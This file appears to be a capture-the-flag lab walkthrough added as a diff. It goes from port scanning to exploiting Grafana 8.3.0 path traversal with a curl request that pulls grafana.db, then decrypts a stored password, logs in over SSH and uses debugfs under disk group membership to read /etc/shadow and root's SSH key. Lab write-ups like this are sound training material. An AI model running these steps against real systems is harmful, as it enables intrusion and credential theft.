@@ -1,0 +1,130 @@
+																							    Fanatastic Walkthrough
+																										
+Attacker's Machine: 192.168.49.68
+Victim's Machine: 192.168.68.181
+export IP=192.168.68.181
+	
+1. nmap -Pn -p- -n  --min-rate 1000 $IP --stats-every=5s
+2. nmap -Pn -n -sC -sV -p22,3000 $IP --open --stats-every=5s -oN results.txt
+
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+3000/tcp open  ppp?
+
+
+3. nmap -sU -n -Pn $IP --top-ports=100 --stats-every=5s --min-rate 1000 
+ <!-- nothing -->
+ 
+
+Vulnerability Assessment
+
+nmap -n $IP -p 3000 -sV --script vuln --stats-every=5s 
+
+Seems to be running Grafana v8.3.0
+
+searchsploit grafana
+Grafana 8.3.0 - Directory Traversal and Arbitrary File Read                                                                                          | multiple/webapps/50581.py
+
+python3 50581.py -H http://$IP:3000
+Read file: /etc/passwd
+
+Search online for Grafana file lists
+
+/etc/grafana/grafana.ini
+/conf/defaults.ini
+/conf/grafana.ini
+/etc/grafana/grafana.ini
+/etc/grafana/defaults.ini
+/etc/passwd
+/etc/shadow
+/home/grafana/.bash_history
+/home/grafana/.ssh/id_rsa
+/root/.bash_history
+/root/.ssh/id_rsa
+/usr/local/etc/grafana/grafana.ini
+/var/lib/grafana/grafana.db
+/proc/net/fib_trie
+/proc/net/tcp
+/proc/self/cmdline
+
+
+
+# default admin user, created on startup
+;admin_user = admin
+
+# default admin password, can be changed before first start of grafana,  or in profile settings
+;admin_password = admin
+
+# used for signing
+;secret_key = SW2YcwTIb9zpOOhoPsMm
+
+curl --path-as-is http://$IP:3000/public/plugins/alertGroups/../../../../../../../../var/lib/grafana/grafana.db -o grafana.db
+
+1|1|1|prometheus|Prometheus|server|http://localhost:9090||||0|sysadmin||0|{}|2022-02-04 09:19:59|2022-02-04 09:19:59|0|{"basicAuthPassword":"anBneWFNQ2z+IDGhz3a7wxaqjimuglSXTeMvhbvsveZwVzreNJSw+hsV4w=="}|0|HkdQ8Ganz
+
+You can use this script to decrypt the password
+
+https://github.com/k1revam/OSCP-Scripts/blob/60cea4b1c4a0b1b08c50618a29cc9fdf7590f0f4/Grafana_decrypt_secret.py
+
+python3 grafana_decrypt_secret.py
+Password : SuperSecureP@ssw0rd
+
+Remember when you read /etc/passwd , we saw that sysadmin has sh on the system, so let's try to log in in the SSH
+
+ssh sysadmin@$IP
+SuperSecureP@ssw0rd
+
+flag: dc187e0d26645456a06e3436120f5714
+
+
+Privilege escalation
+
+id 
+uid=1001(sysadmin) gid=1001(sysadmin) groups=1001(sysadmin),6(disk)           // this looks interesting
+
+Find the partitions owned by disk group
+
+find /dev -group disk
+/dev/btrfs-control
+/dev/sda2
+/dev/sda1
+/dev/sg0
+/dev/sda
+/dev/loop7
+/dev/loop6
+/dev/loop5
+/dev/loop4
+/dev/loop3
+/dev/loop2
+/dev/loop1
+/dev/loop0
+/dev/loop-control
+
+df -h
+Filesystem      Size  Used Avail Use% Mounted on
+udev            445M     0  445M   0% /dev
+tmpfs            98M  1.2M   97M   2% /run
+/dev/sda2       9.8G  6.0G  3.4G  65% /
+tmpfs           489M  3.8M  485M   1% /dev/shm
+tmpfs           5.0M     0  5.0M   0% /run/lock
+tmpfs           489M     0  489M   0% /sys/fs/cgroup
+/dev/loop0       71M   71M     0 100% /snap/lxd/21029
+/dev/loop1       56M   56M     0 100% /snap/core18/2284
+/dev/loop2       62M   62M     0 100% /snap/core20/1328
+/dev/loop3       68M   68M     0 100% /snap/lxd/21835
+/dev/loop4       56M   56M     0 100% /snap/core18/2128
+/dev/loop5       33M   33M     0 100% /snap/snapd/12883
+/dev/loop6       44M   44M     0 100% /snap/snapd/14549
+tmpfs            98M     0   98M   0% /run/user/1001
+
+ Knowing your user is part of the disk group we can use debugfs to enumerate the entire disk with effectively root level privileges. We also have full read-write access to the disk block files, so we can extricate these or write arbitrary data to them. With the disk group, we are effectively root, just in a roundabout way. We will explore the partition where the / (root) directory is mounted on in this case /dev/sda2
+
+debugfs /dev/sda2
+debugfs 1.45.5 (07-Jan-2020)
+debugfs: cat /etc/shadow              // can't crack the password :(
+debugfs: cat /root/.ssh/id_rsa
+
+nano id_rsa
+chmod 600 id_rsa
+ssh -i id_rsa root@$IP
+cd /root
+cat /proof.txt                 // 39afe04ea47fdacce8c1a3f96c50510a
